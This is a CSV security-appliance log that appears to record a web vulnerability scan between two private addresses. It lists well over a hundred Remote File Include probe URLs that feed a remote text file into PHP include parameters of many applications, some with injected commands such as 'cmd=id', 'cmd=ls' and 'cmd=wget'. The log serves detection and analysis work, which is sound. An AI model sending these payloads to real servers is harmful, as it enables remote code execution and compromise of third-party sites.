ID_regla,sessionid,repeatcnt,severity_number,Nombre_regla,thread_category,prot,src_ip,dst_ip,log_subtype,extra_data
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phphd_downloads/common.php?phphd_real_path=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phphost_directoryv2/include/admin.php?rd=http://cirt.net/rfiinc.txt??
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phphtml.php?htmlclass_path=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phpi/edit_top_feature.php?include_connection=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phpi/edit_topics_feature.php?include_connection=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phplib/site_conf.php?ordnertiefe=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phplib/version/1.3.3/functionen/class.csv.php?tt_docroot=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phplib/2.1.5/1.3.3/functionen/class.csv.php?tt_docroot=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phplib/version/1.3.3/functionen/produkte_nach_serie.php?tt_docroot=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phplib/2.1.5/1.3.3/functionen/produkte_nach_serie.php?tt_docroot=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phplib/version/1.3.3/functionen/ref_kd_rubrik.php?tt_docroot=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phplib/2.1.5/1.3.3/functionen/ref_kd_rubrik.php?tt_docroot=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phplib/version/1.3.3/module/hg_referenz_jobgalerie.php?tt_docroot=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phplib/2.1.5/1.3.3/module/hg_referenz_jobgalerie.php?tt_docroot=http://cirt.net/rfiinc.txt?
33327,415453,278,3,PHP Remote File Include Vulnerability,code-execution,tcp,172.16.1.2,172.16.2.2,vulnerability,172.16.2.2/docs/front-end-demo/cart2.php?workdir=http://cirt.net/rfiinc.txt??
54469,415453,1,2,Suspicious File Downloading Detection,code-execution,tcp,172.16.1.2,172.16.2.2,vulnerability,172.16.2.2/dokeos/claroline/resourcelinker/resourcelinker.inc.php?clarolineRepositorySys=http://cirt.net/rfiinc.txt??&cmd=wget%20XXpathXX
32701,415453,1,4,Vmist Downstat stats.php art Parameter PHP File Include Vulnerability,code-execution,tcp,172.16.1.2,172.16.2.2,vulnerability,172.16.2.2/downstat1.8/chart.php?art=http://cirt.net/rfiinc.txt??
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phplib/version/1.3.3/module/produkte_nach_serie_alle.php?tt_docroot=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phplib/2.1.5/1.3.3/module/produkte_nach_serie_alle.php?tt_docroot=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phplib/version/1.3.3/module/ref_kd_rubrik.php?tt_docroot=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phplib/2.1.5/1.3.3/module/ref_kd_rubrik.php?tt_docroot=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phplib/version/1.3.3/module/referenz.php?tt_docroot=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phplib/2.1.5/1.3.3/module/referenz.php?tt_docroot=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phplib/version/1.3.3/module/surfer_aendern.php?tt_docroot=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phplib/2.1.5/1.3.3/module/surfer_aendern.php?tt_docroot=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phplib/version/1.3.3/module/surfer_anmeldung_NWL.php?tt_docroot=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phplib/2.1.5/1.3.3/module/surfer_anmeldung_NWL.php?tt_docroot=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phplib/version/1.3.3/standard/1/lay.php?tt_docroot=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phplib/2.1.5/1.3.3/standard/1/lay.php?tt_docroot=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phplib/version/1.3.3/standard/3/lay.php?tt_docroot=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phplib/2.1.5/1.3.3/standard/3/lay.php?tt_docroot=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phplinks/includes/smarty.php?full_path_to_public_program=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phporacleview/inc/include_all.inc.php?page_dir=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phporacleview/inc/include_all.inc.php?page_dir=http://cirt.net/rfiinc.txt??
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phppc/poll.php?is_phppc_included=1&relativer_pfad=http://cirt.net/rfiinc.txt??
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phppc/poll_kommentar.php?is_phppc_included=1&relativer_pfad=http://cirt.net/rfiinc.txt??
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phppc/poll_sm.php?is_phppc_included=1&relativer_pfad=http://cirt.net/rfiinc.txt??
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phpquickgallery/gallery_top.inc.php?textFile=http://cirt.net/rfiinc.txt?
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phpreactor/inc/polls.inc.php?pathtohomedir=http://cirt.net/rfiinc.txt??
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phpreactor/inc/updatecms.inc.php?pathtohomedir=http://cirt.net/rfiinc.txt??
9999,415464,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phpreactor/inc/users.inc.php?pathtohomedir=http://cirt.net/rfiinc.txt??
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phpreactor/inc/view.inc.php?pathtohomedir=http://cirt.net/rfiinc.txt??
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phpress/adisplay.php?lang=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phpunity-postcard.php?plgallery_epost=1&gallery_path=http://cirt.net/rfiinc.txt??
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phpwcms_template/inc_script/frontend_render/navigation/config_HTML_MENU.php?HTML_MENU_DirPath=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phpwcms_template/inc_script/frontend_render/navigation/config_PHPLM.php?HTML_MENU_DirPath=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/phpyabs/moduli/libri/index.php?Azione=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/pirvate/ltwpdfmonth.php?ltw_config['include_dir]=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/playlist.php?phpbb_root_path=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/plugin/HP_DEV/cms2.php?s_dir=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/plugin/HP_DEV/cms2.php?s_dir=http://cirt.net/rfiinc.txt??
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/plugin/gateway/gnokii/init.php?apps_path[plug]=http://cirt.net/rfiinc.txt??
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/plugins/1_Adressbuch/delete.php?folder=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/plugins/BackUp/Archive.php?bkpwp_plugin_path=http://cirt.net/rfiinc.txt??
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/plugins/BackUp/Archive/Predicate.php?bkpwp_plugin_path=http://cirt.net/rfiinc.txt??
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/plugins/BackUp/Archive/Reader.php?bkpwp_plugin_path=http://cirt.net/rfiinc.txt??
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/plugins/BackUp/Archive/Writer.php?bkpwp_plugin_path=http://cirt.net/rfiinc.txt??
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/plugins/links/functions.inc?_CONF[path]=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/plugins/polls/functions.inc?_CONF[path]=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/plugins/rss_importer_functions.php?sitepath=http://cirt.net/rfiinc.txt??
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/plugins/safehtml/HTMLSax3.php?dir[plugins]=http://cirt.net/rfiinc.txt??
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/plugins/safehtml/safehtml.php?dir[plugins]=http://cirt.net/rfiinc.txt??
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/plugins/spamx/BlackList.Examine.class.php?_CONF[path]=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/plugins/spamx/DeleteComment.Action.class.php?_CONF[path]=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/plugins/spamx/EditHeader.Admin.class.php?_CONF[path]=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/plugins/spamx/EditIP.Admin.class.php?_CONF[path]=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/plugins/spamx/EditIPofURL.Admin.class.php?_CONF[path]=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/plugins/spamx/IPofUrl.Examine.class.php?_CONF[path]=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/plugins/spamx/Import.Admin.class.php?_CONF[path]=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/plugins/spamx/LogView.Admin.class.php?_CONF[path]=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/plugins/spamx/MTBlackList.Examine.class.php?_CONF[path]=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/plugins/spamx/MailAdmin.Action.class.php?_CONF[path]=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/plugins/spamx/MassDelTrackback.Admin.class.php?_CONF[path]=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/plugins/spamx/MassDelete.Admin.class.php?_CONF[path]=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/plugins/staticpages/functions.inc?_CONF[path]=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/plugins/widgets/htmledit/htmledit.php?_POWL[installPath]=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/plume-1.1.3/manager/tools/link/dbinstall.php?cmd=ls&_PX_config[manager_path]=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/plus.php?_pages_dir=http://cirt.net/rfiinc.txt??
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/pmapper-3.2-beta3/incphp/globals.php?_SESSION[PM_INCPHP]=http://cirt.net/rfiinc.txt??
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/pmi_v28/Includes/global.inc.php?strIncludePrefix=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/pmi_v28/Includes/global.inc.php?strIncludePrefix=http://cirt.net/rfiinc.txt??
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/podcastgen1.0beta2/components/xmlparser/loadparser.php?absoluteurl=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/podcastgen1.0beta2/core/admin/admin.php?p=admin&absoluteurl=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/podcastgen1.0beta2/core/admin/categories.php?categoriesenabled=yes&do=categories&action=del&absoluteurl=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/podcastgen1.0beta2/core/admin/categories_add.php?absoluteurl=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/podcastgen1.0beta2/core/admin/categories_remove.php?absoluteurl=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/podcastgen1.0beta2/core/admin/edit.php?p=admin&do=edit&c=ok&absoluteurl=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/podcastgen1.0beta2/core/admin/editdel.php?p=admin&absoluteurl=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/podcastgen1.0beta2/core/admin/ftpfeature.php?p=admin&absoluteurl=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/podcastgen1.0beta2/core/admin/login.php?absoluteurl=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/podcastgen1.0beta2/core/admin/pgRSSnews.php?absoluteurl=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/podcastgen1.0beta2/core/admin/showcat.php?absoluteurl=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/podcastgen1.0beta2/core/admin/upload.php?p=admin&do=upload&c=ok&absoluteurl=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/podcastgen1.0beta2/core/archive_cat.php?absoluteurl=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/podcastgen1.0beta2/core/archive_nocat.php?absoluteurl=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/podcastgen1.0beta2/core/recent_list.php?absoluteurl=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/poll/view.php?int_path=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/pollvote.php?pollNikto=http://cirt.net/rfiinc.txt??&cmd=ls
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/pollvote.php?pollname=http://cirt.net/rfiinc.txt??&cmd=ls
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/pop.php?base=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/popup_window.php?site_isp_root=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/popup_window.php?site_isp_root=http://cirt.net/rfiinc.txt??
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/port.php?content=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/portal/includes/portal_block.php?phpbb_root_path=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/portal/portal.php?phpbb_root_path=http://cirt.net/rfiinc.txt??
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/portfolio.php?id=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/portfolio/commentaires/derniers_commentaires.php?rep=http://cirt.net/rfiinc.txt??
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/post_static_0-11/_lib/fckeditor/upload_config.php?DDS=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/prepare.php?xcart_dir=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/prepare.php?xcart_dir=http://cirt.net/rfiinc.txt??
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/prepend.php?_PX_config[manager_path]=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/preview.php?php_script_path=http://cirt.net/rfiinc.txt??&cmd=dir
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/principal.php?conteudo=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/print.php?page=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/print.php?pager=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/print.php?print=http://cirt.net/rfiinc.txt??
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/process.php?DEFAULT_SKIN=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/professeurs/index.php?repertoire_config=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/profil.php?config[root_ordner]=http://cirt.net/rfiinc.txt??&cmd=id
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/projects/weatimages/demo/index.php?ini[langpack]=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/promocms/newspublish/include.php?path[bdocroot]=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/protection.php?logout_page=http://cirt.net/rfiinc.txt??
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/provider/auth.php?xcart_dir=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/provider/auth.php?xcart_dir=http://cirt.net/rfiinc.txt??
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/psynch/nph-psa.exe?css=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/psynch/nph-psf.exe?css=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/public_html/add-ons/modules/sysmanager/plugins/install.plugin.php?AURORA_MODULES_FOLDER=http://cirt.net/rfiinc.txt??
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/public_html/modules/Forums/favorites.php?nuke_bb_root_path=http://cirt.net/rfiinc.txt??
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/public_includes/pub_blocks/activecontent.php?vsDragonRootPath=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/public_includes/pub_popup/popup_finduser.php?vsDragonRootPath=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/qsgen_0.7.2c/qlib/smarty.inc.php?CONFIG[gameroot]=http://cirt.net/rfiinc.txt??
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/qsgen_0.7.2c/server_request.php?CONFIG[gameroot]=http://cirt.net/rfiinc.txt??
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/qte_web.php?qte_web_path=http://cirt.net/rfiinc.txt??
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/quick_reply.php?phpbb_root_path=http://cirt.net/rfiinc.txt?&mode=[file]
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/quickie.php?QUICK_PATH=http://cirt.net/rfiinc.txt??&cmd=id
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/random2.php?path_to_folder=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/randshop/index.php?incl=http://cirt.net/rfiinc.txt??
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/rdf.php?page[path]=http://cirt.net/rfiinc.txt??&cmd=ls
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/reactivate.php?base_dir=http://cirt.net/rfiinc.txt?
9999,415465,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/read.php?data=http://cirt.net/rfiinc.txt??
9999,415466,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/readmore.php?config[\
9999,415466,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/recent.php?insPath=http://cirt.net/rfiinc.txt?
9999,415466,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/rechnung.php?_PHPLIB[libdir]=http://cirt.net/rfiinc.txt??
9999,415466,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/reconfig.php?GLOBALS[CLPath]=http://cirt.net/rfiinc.txt?
9999,415466,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/redaxo/include/addons/import_export/pages/index.inc.php?REX[INCLUDE_PATH]=http://cirt.net/rfiinc.txt?
9999,415466,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/redirect.php?url=http://cirt.net/rfiinc.txt?
9999,415466,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/redsys/404.php?REDSYS[MYPATH][TEMPLATES]=http://cirt.net/rfiinc.txt?
9999,415466,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/register.php?base_dir=http://cirt.net/rfiinc.txt?
9999,415466,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/releasenote.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
9999,415467,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/rempass.php?lang=http://cirt.net/rfiinc.txt?
9999,415467,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/report.php?scriptpath=http://cirt.net/rfiinc.txt??
9999,415467,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/reports/who_r.php?bj=http://cirt.net/rfiinc.txt?
9999,415467,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/resources/includes/class.Smarty.php?cfg[sys][base_path]=http://cirt.net/rfiinc.txt?
9999,415467,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/ressourcen/dbopen.php?home=http://cirt.net/rfiinc.txt??
9999,415467,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/robotstats.inc.php?DOCUMENT_ROOT=http://cirt.net/rfiinc.txt??
9999,415467,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/root/public/code/cp_html2txt.php?page=http://cirt.net/rfiinc.txt?
9999,415467,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/routines/fieldValidation.php?jssShopFileSystem=http://cirt.net/rfiinc.txt?
